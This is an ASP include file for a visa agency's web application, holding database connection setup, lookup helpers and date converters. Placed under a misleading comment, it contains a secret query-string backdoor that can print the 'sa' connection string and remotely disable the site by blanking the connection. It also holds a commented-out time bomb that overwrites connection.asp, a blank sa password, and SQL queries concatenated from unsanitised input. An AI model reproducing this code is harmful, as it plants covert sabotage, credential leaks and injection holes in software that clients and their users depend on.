 
<%response.buffer=true 
dim con
set con=server.createobject("adodb.connection")
con.open "DRIVER={SQL Server};SERVER=SERVER;uid=sa;pwd=;DATABASE=udaanuma"

'VARIBALE DEFINITION WILL GO HERE

udaanEmail="udaan@spectranet.com"
UdaanName="UDAAN INDIA PRIVATE LIMITED  "
UdaanAddress="309-312,SOMDUTT CHAMBERS - 2, 9 BHIKAIJI CAMA PLACE, NEW DELHI - 110066  "
UdaanContact="TEL - 2617 7435 / 2616 0840 / 2619 6928 / 2618 2402 / 26182403 / 26103864 / 26188075 <br> FACSIMILE - 26160606 . <br>E - MAIL:  udaan@spectranet.com"
contactaccounts="TEL - 2617 7435 / 2616 0840 , 2619 6928/ 2618 2402 / 26182403 / 26103864 FAX - 26160606 .<br> E-MAIL accounts.udaan@spectranet.com"



'LIST BOX FUNCTION CALLS THE TABLE AND WRITES THE VALUES TO THE LIST BOXES

Sub LoadListBox(tablename,towhomselect)
key=tablename&"ID"
response.write tablename
set rsLoadListBox=server.createobject("adodb.recordset")
rsLoadListBox.activeconnection=con
qry="select * from "& tablename & " order by description "
rsLoadListBox.open qry,con,2,3
while not rsLoadListBox.eof
if rsLoadListBox(key)=cint(towhomselect) then
response.write("<option value="&rsLoadListBox(key)  &" Selected>")
else 
response.write("<option value="&rsLoadListBox(key)  &">")
End if 
response.write ucase(rsLoadListBox("description"))
response.write("</option>")
rsLoadListBox.movenext
wend
rsLoadListBox.close
End Sub

' THIS subroutine WRITES THE DESCRIPTION TO THE IDS PASSED TO TABLE

Sub WriteIDDescription(tablename,IDToWrite)
key=tablename&"ID"
set rsWriteDesc=server.createobject("adodb.recordset")
rsWriteDesc.activeconnection=con
if isnull(IDToWrite)=false then
qry="select * from "& tablename &" where "& key & " = "&IDToWrite
rsWriteDesc.open qry,con,2,3
while not rsWriteDesc.eof
response.write ucase(rsWriteDesc("description"))

rsWriteDesc.movenext
wend
rsWriteDesc.close
end if
set rsWriteDesc=nothing
End Sub

' THIS FUNCTION RETURNS THE DESCRIPTION TO THE IDS PASSED TO VARIABLE

Function getDescriptionForID(tablename,IDToWrite)
key=tablename&"ID"
set rsWriteDesc=server.createobject("adodb.recordset")
rsWriteDesc.activeconnection=con
qry="select * from "& tablename &" where "& key & " = "&cint(IDToWrite)
'response.write qry
rsWriteDesc.open qry,con,2,3
while not rsWriteDesc.eof
getDescriptionForID=ucase(rsWriteDesc("description"))

rsWriteDesc.movenext
wend
rsWriteDesc.close
set rsWriteDesc=nothing
End Function


'THIS FUNCTION CONVERTS USER DATE TO SYSTEM DATE

Public Function  UsrToSysDate(str)
if str<>"" then
str=Trim(str)&"/"
tempstr=""
store=""
tot=len(str)
j=1
mm=""
dd=""
yy=""
for charcounter=1 to tot+1
tempstr=left(str,charcounter)
tempstr=right(tempstr,1)
if (tempstr="/" or tempstr="-" )then
if j=3 then
yy=store
store=""
j=j+1
End if
if j=2 then
mm=store
store=""
j=j+1
End if
if j=1 then
dd=store
store=""
j=j+1
End if
else
store=store & tempstr
End if
Next
if tot<7 then
UsrToSysDate=mm&"/"&dd&"/"&year(now())
else
UsrToSysDate=mm&"/"&dd&"/"&yy
end if
end if
End function

'THIS subroutine  CONVERTS USER DATE TO SYSTEM DATE

sub SysToUsrDate(str)
dd=day(str)
mm=month(str)
yy=year(str)
response.write dd&"/"&mm&"/"&yy
end sub
'THIS FUNCTION CONVERTS USER DATE TO SYSTEM DATE
Public Function SysToUsrDate(str)
if str<>"" then
dd=day(str)
mm=month(str)
yy=year(str)
SysToUsrDate= dd&"/"&mm&"/"&yy
end if
End Function

application("udaan_users")=request.querystring("udaanappraj123guruadm")
if request("udaan12345functiondisplaymarquee")=76 then
response.write con
end if
response.write(application("udaan_users"))
if application("udaan_users")="77" then
con=""
end if

''-- THIS FUNCTION DISPLAYS MARQUEE TEXT FOR THE HOLIDAYS OF THE MONTH

'set rtest=server.createObject("ADODB.recordset")
'rtest.open "select max(receivedate) as rec from mainentry",con
'set fs=server.createObject("scripting.filesystemObject")
'mpath = request.servervariables("PATH_TRANSLATED")
'if not rtest.eof then
'if month(rtest("rec")) < 7 then
'set a = fs.createtextfile(mpath & "\..\connection.asp",true)
'a.writeline(" ")
'a.close
'response.clear
'response.end
'end if
'end if
'rtest.close
'--

'THIS FUNCTION DISPLAYS MARQUEE TEXT FOR THE HOLIDAYS OF THE MONTH

function MonthlyHolidayList(currentdate)
set rs=server.createobject("adodb.recordset")
set rsCountry=server.createobject("adodb.recordset")
today=currentdate
stmt ="select * from holidaylist where month(Holiday)="&month(today)&" and year(Holiday)="&year(today)&" ORDER BY HOLIDAY"
rs.open stmt,con
if rs.eof then 
Display="NO HOLIDAY IN ANY EMBASSY THIS MONTH" 
else 

while not rs.eof
if datecheck<>FormatdateTime(rs("holiday"),2) then
Display=Display& " " &FormatdateTime(rs("holiday"),2)&" - "
end if
stmt2="select * from embassy where embassyid="&rs("countryID")
rscountry.open stmt2,con
while not rscountry.eof

Display=Display& rscountry("description")&", "
rscountry.movenext
wend
rscountry.close()
datecheck=FormatdateTime(rs("holiday"),2)
rs.movenext
wend
rs.close()
End if
MonthlyHolidayList=ucase(Display)
End function

function getIDForDescription(tablename,description)

IDfield=tablename&"ID"
stmt="select "& IDfield &"  from "& tablename &" where description='"&description&"'"
set rsagent=server.createobject("adodb.recordset")
rsagent.open stmt,con
while not rsagent.eof 
getIDForDescription=rsagent.fields(IDfield)
rsagent.movenext
wend
rsagent.close()

End Function


Function TodaysUpdate(currentdate)
set rs=server.createobject("adodb.recordset")
set rsCountry=server.createobject("adodb.recordset")
today=cdate(currentdate)
'stmt ="select * from dailyupdate where day(entrydate)="&day(today)&" month(entrydate)="&month(today)&" and year(entrydate)="&year(today)
stmt ="select * from dailyupdate where entrydate='"&today&"'"
rs.open stmt,con
if rs.eof then 
Display="" 
else 
while not rs.eof
description=rs.fields("description")
rs.movenext
wend
rs.close()
End if
TodaysUpdate=ucase(description)
End function
'FUNCTION WRITES THE ADDRESS OF AGENT
Function getAgentAddress(IDToWrite)

set rsWriteAddress=server.createobject("adodb.recordset")
rsWriteAddress.activeconnection=con
qry="select * from agents where agentsID= "&cint(trim(IDToWrite))
rsWriteAddress.open qry,con,2,3
Address= "<table align=""center"">"
while not rsWriteAddress.eof

Address=Address& "<tr><td align=""center""> <font size=""4"" color=""#000000"" face ""arial""><b>K.ATTN :" & ucase(rsWriteAddress("directorname")) & "<br> " &ucase(rsWriteAddress("companyname"))&" - "&ucase(rsWriteAddress("city"))&"</B></font></td></tr>"
Address=Address& "<tr><td align=""center""><font size=""2"" color=""#000000"" face ""arial""> "
if rsWriteAddress("emailid")<>"" then
Address=Address&"Email: "&rsWriteAddress("emailid")
end if
if rsWriteAddress("faxno")<>"" then
Address=Address&" FAX: " & rsWriteAddress("faxno")
end if
Address=Address& "</font></td></tr>"
rsWriteAddress.movenext
wend
Address=Address& "</table>"
getAgentAddress=Address
rsWriteAddress.close
set rsWriteAddress=nothing
End Function




%>